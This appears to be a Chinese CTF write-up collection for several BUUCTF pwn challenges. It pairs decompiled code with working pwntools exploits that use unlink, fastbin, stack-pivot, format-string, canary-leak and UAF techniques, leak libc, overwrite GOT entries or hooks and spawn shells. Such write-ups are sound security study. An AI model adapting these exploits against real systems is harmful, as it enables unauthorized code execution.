# buu-pwn

> 这里的题目我已经写了一部分了之前的wp会分开补发，现在的是我在学的时候学的一个顺序

## hitcontraining_bamboobox

这个题目还是比较简单的一个题目，因此我们这里直接进行代码的分析直接使用ida进行一个反编译

```c
unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;// edit 溢出
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020C8 + 2 * i) )
      printf("%d : %s", i, *((const char **)&unk_6020C8 + 2 * i));
  }
  return puts(byte_401089);
}
```

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020C8 + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&unk_6020C8 + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * i) + (int)read(0, *((void **)&unk_6020C8 + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      free(*((void **)&unk_6020C8 + 2 * v1));
      *((_QWORD *)&unk_6020C8 + 2 * v1) = 0LL;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

至此我已经把我该脚本中的核心代码部分进行了一个粘贴，下面我进行一个解释

add:

```tex
这个函数主要是对堆块的一个创建，和内如的一个写入
```

edit：

```tex
出现堆溢出的情况
```

free：

```tex
这里主要是没有出现uaf
```

show：

```tex
创建查看到一个文件的内容
```

这里的思路是：

- 通过edit对chunk进行一个溢出

- 攻击手法使用通过fastbin，获得malloc_hook或者使用unlink使用free hook连接system

这里我们我们使用的方法是通过unlink进行一个freehook的获取攻击

```py
from pwn import *
from LibcSearcher import *
#r=process('bamboobox')
r=remote('node3.buuoj.cn',29464)
elf=ELF('bamboobox')
context.log_level="debug"


def add(length,context):
    r.recvuntil("Your choice:")
    r.sendline("2")
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the name of item:")
    r.send(context)

def edit(idx,length,context):
    r.recvuntil("Your choice:")
    r.sendline("3")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the new name of the item:")
    r.send(context)

def free(idx):
    r.recvuntil("Your choice:")
    r.sendline("4")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))

def show():
    r.sendlineafter("Your choice:", "1")

add(0x40,'a' * 8)
add(0x80,'b' * 8)
add(0x80,'c' * 8)
add(0x20,'/bin/sh\x00')
#gdb.attach(r)

ptr=0x6020c8
fd=ptr-0x18
bk=ptr-0x10

fake_chunk=p64(0)
fake_chunk+=p64(0x41)
fake_chunk+=p64(fd)
fake_chunk+=p64(bk)
fake_chunk+='\x00'*0x20
fake_chunk+=p64(0x40)
fake_chunk+=p64(0x90)

edit(0,len(fake_chunk),fake_chunk)
#gdb.attach(r)

free(1)
free_got=elf.got['free']
log.info("free_got:%x",free_got)
payload=p64(0)+p64(0)+p64(0x40)+p64(free_got)
edit(0,len(fake_chunk),payload)
#gdb.attach(r)

show()
free_addr=u64(r.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) 
log.info("free_addr:%x",free_addr)
libc=LibcSearcher('free',free_addr)
libc_base=free_addr-libc.dump('free')
log.info("libc_addr:%x",libc_base)
system_addr=libc_base+libc.dump('system')
log.info("system_addr:%x",system_addr)
edit(0,0x8,p64(system_addr))

#gdb.attach(r)


free(3)
r.interactive()
‘’’
这里的思路主要是通过unlink吧chunk0块申请出来，然后再这个位置吧我们的free hook写入进行，获取到libc地址，最后在这个位置写入system函数的地址来获取权限
‘’‘
```

fastbin:

```py
from pwn import *

p = process('/home/fofa/bamboobox')
libc = ELF('/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
context.log_level = 'debug'

def duan():
    gdb.attach(p)
    pause()
def add(size,content):
    p.sendlineafter('choice:','2')
    p.sendlineafter('name:',str(size))
    p.sendafter('item:',content)
def show():
    p.sendlineafter('choice:','1')
def edit(index,size,content):
    p.sendlineafter('choice:','3')
    p.sendlineafter('item:',str(index))
    p.sendlineafter('name:',str(size))
    p.sendafter('item:',content)
def delete(index):
    p.sendlineafter('choice:','4')
    p.sendlineafter('item:',str(index))

og = [0x45226,0x4527a,0xf0364,0xf1207]

add(0x20,'aaaaaaaa')
add(0x20,'bbbbbbbb')
add(0x60,'cccccccc')
add(0x10,'cccccccc')

edit(0,0x30,b'a'*0x20+p64(0)+p64(0xa1))
delete(1)
add(0x20,'aaaaaaaa')
show()
libc_base = u64(p.recv(0x3a)[-6:].ljust(8,b'\x00'))-88-0x10-libc.symbols['__malloc_hook']
malloc_hook = libc_base+libc.symbols['__malloc_hook']
realloc = libc_base+libc.symbols['realloc']
print ('libc_base-->'+hex(libc_base))
print ('malloc_hook-->'+hex(malloc_hook))
shell = libc_base+og[3]

add(0x60,'bbbbbbbb')
delete(4)
edit(2,0x10,p64(malloc_hook-0x23))
add(0x60,'aaaaaaaa')
add(0x60,'a'*(0x13-0x8)+p64(shell)+p64(realloc+20))
# p.sendlineafter('choice:','2')
# p.sendlineafter('name:',str(0x10))

gdb.attach(p)
p.interactive()
'''
这个使用的方法同样可以调用，但是需要调一下，
思路：
构建一个溢出，获得libc，再通过og进行一个权限获取，主要是malloc-hook-0x23的位置有一个0x70的一个size，可以申请malloc-hook出来，从而获得权限，但是我是用这个方法并不能chengg
'''
```

## actf_2019_babystack

这里我们直接看保护和ida反编译

```shell
[*] '/home/fofa/ACTF_2019_babystack'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE s[208]; // [rsp+0h] [rbp-D0h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  signal(14, (__sighandler_t)handler);
  alarm(0x3Cu);
  memset(s, 0, sizeof(s));
  puts("Welcome to ACTF's babystack!");
  sleep(3u);
  puts("How many bytes of your message?");
  putchar(62);
  sub_400A1A();
  if ( nbytes <= 0xE0 )
  {
    printf("Your message will be saved at %p\n", s);
    puts("What is the content of your message?");
    putchar(62);
    read(0, s, nbytes);
    puts("Byebye~");
    return 0LL;
  }
  else
  {
    puts("I've checked the boundary!");
    return 1LL;
  }
}
```

在这里我们知道我们写入的数据就只能放到返回地址的位置因此我们只能使用栈迁移进行一个攻击这里直接使用exp：

```py
from pwn import *
from LibcSearcher import *
context(log_level='debug',arch='amd64',os='linux')

elf=ELF('/home/fofa/ACTF_2019_babystack')
libc=ELF('/home/fofa/buulibc/libc-2.27-64.so')
#p=process('./ACTF_2019_babystack')
p=remote('node5.buuoj.cn',26823)

main=0x4008f6
leave=0x400a18
pop_rdi=0x400ad3
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

p.recvuntil('>')
p.sendline(str(0xe0))
p.recvuntil('Your message will be saved at ')
s_addr=int(p.recvuntil('\n',drop=True),16)

payload = b'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
payload += b'a'*(0xd0-len(payload))+p64(s_addr)+p64(leave)

p.recvline()
p.recvuntil('>')
p.send(payload)

p.recvuntil('Byebye~\n')
puts_addr = u64(p.recvuntil('\n',drop = True).ljust(8,b'\x00'))
libcbase = puts_addr - libc.symbols['puts']
one_gadget = libcbase + 0x4f2c5


p.recvuntil('>')
p.sendline(str(0xe0))
p.recvuntil('Your message will be saved at ')
s_addr=int(p.recvuntil('\n',drop=True),16)

payload = b'a'*8 + p64(one_gadget)
payload += b'a'*(0xd0-len(payload))+p64(s_addr)+p64(leave)

p.recvline()
p.recvuntil('>')
p.send(payload)

p.interactive()

```

## wdb2018_guess

这个题目也是要给一个有意思的题目这里就直接上ida和保护

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] BYREF
  __int64 v6; // [rsp+20h] [rbp-80h]
  __int64 v7; // [rsp+28h] [rbp-78h]
  char buf[48]; // [rsp+30h] [rbp-70h] BYREF
  char s2[56]; // [rsp+60h] [rbp-40h] BYREF
  unsigned __int64 v10; // [rsp+98h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v7 = 3LL;
  LODWORD(stat_loc.__uptr) = 0;
  v6 = 0LL;
  sub_4009A6(a1, a2, a3);
  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0);
  if ( HIDWORD(stat_loc.__iptr) == -1 )
  {
    perror("./flag.txt");
    _exit(-1);
  }
  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);
  close(SHIDWORD(stat_loc.__iptr));
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( v6 >= v7 )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    if ( !(unsigned int)sub_400A11() )
      break;
    ++v6;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(s2);
  if ( !strcmp(buf, s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```

这里这个就是一个逻辑：我们连续输入3次并且，他再stack上写入了flag这个文件因此我们需要获取到栈上的一个数据，这里需要泄露数据，注意一个要点是我们canary溢出后还是可以运行的所以可以使用canary进行一个泄露信息，这里我们可以使用的方法是通过libc的函数来泄露栈的地址，获取flag文件

```py
#coding:utf8
from pwn import *
from LibcSearcher import *

p = process('/home/fofa/GUESS')
# p = remote('node5.buuoj.cn',29278)
elf = ELF('/home/fofa/GUESS')
puts_got = elf.got['puts']
context.log_level="debug"

#泄露puts地址


payload=b'a'*0x128 + p64(puts_got)
p.sendlineafter('Please type your guessing flag',payload)
p.recvuntil('stack smashing detected ***: ')

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
info("puta_addr:"+hex(puts_addr))
libc=ELF('/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

libc_base = puts_addr - libc.sym['puts']
environ_addr = libc_base + libc.sym['__environ']
print ('environ_addr=',hex(environ_addr))

#泄露栈地址
payload=b'a'*0x128 + p64(environ_addr)
p.sendlineafter('Please type your guessing flag',payload)
#

p.recvuntil('stack smashing detected ***: ')
stack_addr = u64(p.recv(6).ljust(8,b'\x00'))
print ('stack_addr=',hex(stack_addr))
# gdb.attach(p)
gdb.attach(p)
pause()
flag_addr = stack_addr - 0x168
print ('flag_addr=',hex(flag_addr))
#泄露flag
payload=b'a'*0x128 + p64(flag_addr)
p.sendlineafter('Please type your guessing flag',payload)

p.interactive()

```

## zctf_2016_note3

ida

```c
int addr()
{
  int i; // [rsp+Ch] [rbp-14h]
  __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 6 && *(&ptr + i); ++i )
    ;
  if ( i == 7 )
    puts("Note is full, add fail");
  puts("Input the length of the note content:(less than 1024)");
  size = sub_4009B9();
  if ( size < 0 )
    return puts("Length error");
  if ( size > 1024 )
    return puts("Content is too long");
  v3 = malloc(size);
  puts("Input the note content:");
  sub_4008DD(v3, size, 10LL);
  *(&ptr + i) = v3;
  qword_6020C0[i + 8] = size;//这个位置写了chunk的位置，但是该位置和我们的chunk的地址内存存放地点是同一个数组，因此可能存在着一个溢出，size的一个篡改的问题
  qword_6020C0[0] = (__int64)*(&ptr + i);
  return printf("note add success, the id is %d\n", i);
}
```

```c
int sub_400BFD()
{
  return puts("No show, No leak.");
}
```

```c
int sub_400C0D()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7//验证是否是7的倍数要求idx要小于7
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      puts("Input the new content:");
      sub_4008DD(*(&ptr + v3), qword_6020C0[v3 + 8], 10LL);//这里存在一个溢出
      qword_6020C0[0] = (__int64)*(&ptr + v3);
      LODWORD(v1) = puts("Edit success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

```c
int sub_400B33()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7;
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      free(*(&ptr + v3));
      if ( (void *)qword_6020C0[0] == *(&ptr + v3) )//没有uaf
        qword_6020C0[0] = 0LL;
      *(&ptr + v3) = 0LL;
      LODWORD(v1) = puts("Delete success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

### 思路

**1.unlink**

添加7个块后，再添加一个块(`i=7`)，这时块0的大小会被改的很大(值为块7的地址)，然后在块0中构造fake_chunk并溢出到下一个块修改header数据实现unlink。需要注意第`i=1`个块时大小要超过fastbin的范围。

**2.泄露地址**

unlink后可以实现任意写。为了泄露函数地址，需要执行输出函数，可以将`free@got`值改为`puts@plt`值，然后将块`i`的地址改为`puts@got`的地址，这时调用删除功能`free(块i)`就可以输出`puts@got`的值，从而得到动态链接库加载地址，进一步得到`system`地址。

**3.getshell**

最后将`atoi@got`值改为`system`地址，然后在选择功能时输入`/bin/sh`即可得到shell。



```py
from pwn import *
context(log_level='debug' ,arch='amd64' ,os='linux')
# io = remote("node5.buuoj.cn",27011)
io =process("/home/fofa/zctf_2016_note3")

def add_chunk(size,content):
    io.sendlineafter("option--->>",'1')
    io.sendlineafter("Input the length of the note content:(less than 1024)",str(size))
    io.sendlineafter("Input the note content:",content)

def edit_chunk(idx,content):
    io.sendlineafter("option--->>", '3')
    io.sendlineafter("Input the id of the note:", str(idx))
    io.sendlineafter("Input the new content:", content)

def delete_chunk(idx):
    io.sendlineafter("option--->>", '4')
    io.sendlineafter("Input the id of the note:", str(idx))

add_chunk(0x40, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
gdb.attach(io)
p = 0x6020C8
fd = p-0x18
bk = p-0x10
payload = p64(0) + p64(0x31) + p64(fd) + p64(bk) + b'a'*0x10 + p64(0x30) + b'b'*0x8
payload += p64(0x40) + p64(0x90)

edit_chunk(0,payload)
delete_chunk(1)
elf = ELF("/home/fofa/zctf_2016_note3")
payload = p64(0)*3 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(0x6020c8)
edit_chunk(0,payload)
edit_chunk(0, p64(elf.plt['puts'])[:-1])

delete_chunk(1)

io.recvuntil('\n')
puts_addr = u64(io.recvuntil('\n')[:-1].ljust(8,b'\x00'))

info("puts_addr:"+hex(puts_addr))

libc = ELF("/home/fofa/buulibc/libc-2.23-64.so")
libc.address = puts_addr - libc.sym['puts']
sys_addr =libc.sym['system']
info("libc.address:"+hex(libc.address))
info("system:"+hex(sys_addr))

edit_chunk(2, p64(elf.got['atoi']))
edit_chunk(0, p64(sys_addr))
io.sendlineafter('option--->>','/bin/sh\x00')

# gdb.attach(io)
io.interactive()
```

## ciscn_2019_sw_1

直接上ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[68]; // [esp+0h] [ebp-48h] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Welcome to my ctf! What's your name?");
  __isoc99_scanf("%64s", format);
  printf("Hello ");
  printf(format);
  return 0;
}
```

这里我们知道这里就只有一个输入点因此要一次就出来所以要提前进行编写文件这里直接上exp

```py
from pwn import *
io = remote("node5.buuoj.cn",25952)
# io = process("/home/fofa/ciscn_2019_sw_1")
payload =b'%2052c%13$hn%31692c%14$hn%356c%15$hn' +p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
# gdb.attach(io,'b *0x080485A8\nc')
io.sendline(payload)

io.sendline('/bin/sh\x00')
io.interactive()
```

### 总结

我们在程序中可以知道一个程序开始的第一个函数并不是main函数，也不是一个libc_start_main，而是start这个函数，因此我们需要看一下这个的汇编和代码，这里我们使用上一题的start进行一个演示

```asm
							   public _start
.text:08048420 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048420                 xor     ebp, ebp
.text:08048422                 pop     esi
.text:08048423                 mov     ecx, esp
.text:08048425                 and     esp, 0FFFFFFF0h
.text:08048428                 push    eax
.text:08048429                 push    esp             ; stack_end
.text:0804842A                 push    edx             ; rtld_fini
.text:0804842B                 push    offset __libc_csu_fini ; fini
.text:08048430                 push    offset __libc_csu_init ; init
.text:08048435                 push    ecx             ; ubp_av
.text:08048436                 push    esi             ; argc
.text:08048437                 push    offset main     ; main
.text:0804843C                 call    ___libc_start_main
.text:08048441                 hlt
.text:08048441 _start          endp
```

可以在这里知道，在start结束的时候会调用__libc_start_main,而我们需要也要了解一下libc-start-main的函数

```c
// attributes: thunk
int __cdecl __libc_start_main(
        int (__cdecl *main)(int, char **, char **),
        int argc,
        char **ubp_av,
        void (*init)(void),
        void (*fini)(void),
        void (*rtld_fini)(void),
        void *stack_end)
{
  return _libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
```

可以看到，包含有main，init，fini，既然传进去了这些参数，那必然有他们的用处，main和init就不用多说了，fini是

同样，**__libc_start_main的返回地址就是__libc_csu_fini**，证明它是在__libc_start_main在结束后就会调用__libc_csu_fini，要是我们能对它进行一些修改，那说不定就能做一些“坏事”。我们来看看跟它相关的东西。
我们可以在fini_array段找到与__libc_csu_fini相关的东西，是数组

这个数组里存放着一些函数的指针，并且**在进入__do_global_dtors_aux这个函数中会遍历并且调用各个指针，__do_global_dtors_aux_fini_array_entry是一个在程序结束时需要调用的函数的名称，它的地址偏移量在这里被存储**，也就是说，如果我们能**把__do_global_dtors_aux_fini_array_entry指向的地址变为main函数或者其它的地址，就可以进行一些非法操作**
这就是fini_array在x86下格式化字符串的基本应用
不过需要注意的是，`_init_array的下标是从小到大开始执行，而_fini_array的下标是从大到小开始执行`这对我们构造payload起到非常关键的作用

同样也就是说我们使用的这个指针指向的是一个陈旭结束后的一个地址，可以通过这个地址来修改我们后面的参数是否需要在结束后是否继续调用main这个函数的的一个回调，因此这个是fini_array在格式化字符串的一个基本应用

## gyctf_2020_document

这个题目还是非常简单的一个题目但是又几个坑的这里我先说逻辑

```c
unsigned __int64 add()
{
  int i; // [rsp+Ch] [rbp-24h]
  _QWORD *v2; // [rsp+10h] [rbp-20h]
  _QWORD *v3; // [rsp+18h] [rbp-18h]
  __int64 s; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < 7; ++i )
  {
    if ( !qword_202060[i] )
    {
      v2 = malloc(8uLL);
      v3 = malloc(0x80uLL);
      if ( !v2 || !v3 )
      {
        puts("Error occured!!!");
        exit(2);
      }
      puts("add success");
      *v2 = v3;
      v2[1] = 1LL;
      puts("input name");
      memset(&s, 0, sizeof(s));
      sub_AA0(&s, 8LL);
      *v3 = s;
      puts("input sex");
      memset(&s, 0, sizeof(s));
      sub_AA0(&s, 1LL);
      puts("here");
      if ( (_BYTE)s == aW[0] )
      {
        v3[1] = 1LL;
      }
      else
      {
        puts("there");
        v3[1] = 16LL;
      }
      puts("input information");
      sub_AA0(v3 + 2, 112LL);
      qword_202060[i] = v2;
      puts("Success");
      break;
    }
  }
  if ( i == 7 )
    puts("Th3 1ist is fu11");
  return __readfsqword(0x28u) ^ v5;
}
```

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_117B(a1, a2, a3);
  sub_1125();
  while ( 1 )
  {
    while ( 1 )
    {
      sub_1138();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 2LL )
        break;
      show();
    }
    if ( v3 > 2LL )
    {
      if ( v3 == 3LL )
      {
        edit();
      }
      else if ( v3 == 4LL )
      {
        delete();
      }
    }
    else if ( v3 == 1LL )
    {
      add();
    }
  }
}
```

```c
unsigned __int64 sub_1042()
{
  unsigned int v1; // [rsp+Ch] [rbp-24h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, buf, 8uLL);
  v1 = atoi(buf);
  if ( v1 >= 7 )
  {
    puts("Out of list");
  }
  else if ( *((_QWORD *)&qword_202060 + v1) )
  {
    free(**((void ***)&qword_202060 + v1));
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

```c
unsigned __int64 sub_E4E()
{
  unsigned int v1; // [rsp+8h] [rbp-28h]
  __int64 v2; // [rsp+10h] [rbp-20h]
  _BYTE *v3; // [rsp+18h] [rbp-18h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, buf, 8uLL);
  v1 = atoi(buf);
  if ( v1 >= 7 )
  {
    puts("Out of list");
  }
  else if ( *((_QWORD *)&qword_202060 + v1) )
  {
    v2 = *((_QWORD *)&qword_202060 + v1);
    if ( *(_QWORD *)(v2 + 8) )
    {
      puts("Are you sure change sex?");
      read(0, buf, 8uLL);
      if ( buf[0] == aY[0] )
      {
        puts("3");
        v3 = (_BYTE *)(**((_QWORD **)&qword_202060 + v1) + 8LL);
        if ( *v3 == unk_13DE )
        {
          puts(&a124[2]);
          *v3 = 1;
        }
        else
        {
          puts(a124);
          *v3 = 16;
        }
      }
      else
      {
        puts(&a124[4]);
      }
      puts("Now change information");
      if ( !(unsigned int)sub_AA0(**((_QWORD **)&qword_202060 + v1) + 16LL, 112LL) )
        puts("nothing");
      *(_QWORD *)(v2 + 8) = 0LL;
    }
    else
    {
      puts("you can onyly change your letter once.");
    }
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

上面的几个函数大概率就可以把逻辑搞清楚了这里我们说一下思路：

1.通过uaf漏洞先泄露libc 2.申请free 3.修改free-got=system

大概的思路时这样的这里我说一下坑

```tex
在创建的时候我们知道这个文件出现了一个控制块，这个控制块指向了我们数据会存放的一个数据块的位置，同时也是你edit的要给位置，因此我们这里大概想法就是通过uaf修改来修改这个控制块的大小
这里我们可以通过我们删除的chunk0，的数据块来对其他chunk进行一个控制，这样就出现了一个堆块重叠，这里出现了一个坑就是他的free文件结束后后面的hook会影响整个system函数因此要把这个数据给清空
```



exp:

```py
from pwn import *
context.log_level='debug'
io = process("/home/fofa/gyctf_2020_document")
# io = remote("node5.buuoj.cn",29814)
libc = ELF("/home/fofa/buulibc/libc-2.23-64.so")

def add_chunk(name, sex, content):
    io.recvuntil('Give me your choice : \n')
    io.sendline('1')
    io.recvuntil("input name\n")
    io.send(name)
    io.recvuntil("input sex\n")
    io.send(sex)
    io.recvuntil("input information\n")
    io.send(content)


def delete_chunk(index):
    io.recvuntil('Give me your choice : \n')
    io.sendline('4')
    io.recvuntil("Give me your index : \n")
    io.sendline(str(index))


def show_chunk(index):
    io.recvuntil('Give me your choice : \n')
    io.sendline('2')
    io.recvuntil("Give me your index : \n")
    io.sendline(str(index))


def edit_chunk(index, content):
    io.recvuntil('Give me your choice : \n')
    io.sendline('3')
    io.recvuntil("Give me your index : \n")
    io.sendline(str(index))
    io.recvuntil("Are you sure change sex?\n")
    io.send('N\n')
    io.recvuntil("Now change information\n")
    io.send(content)


add_chunk('1'+'\x00'*7, 'W'+'\x00'*7, 'a'*0x70)#0
add_chunk('2'+'\x00'*7, 'w'+'\x00'*7, 'b'*0x70)#1

delete_chunk(0)
show_chunk(0)
# io.recv()
libc.address=u64(io.recv(6)[-6:].ljust(8,b'\x00'))-0x3c4b20-0x58
info("libc.address"+hex(libc.address))
add_chunk('/bin/sh\x00', '/bin/sh\x00', 'c'*0x70)#2
delete_chunk(1)
add_chunk('/bin/sh\x00', '/bin/sh\x00', 'd'*0x70)#3
#
payload=p64(0)+p64(0x21)+p64(libc.sym['__free_hook']-0x10)+p64(0x1)+p64(0)+p64(0x51)+p64(0)*8
# payload1 = p64(0x21)+p64(0x21)
edit_chunk(0,payload)
system_addr = libc.sym['system']
edit_chunk(3,p64(system_addr)+p64(0)*13)
gdb.attach(io)

delete_chunk(1)
# gdb.attach(io)

io.interactive()
```

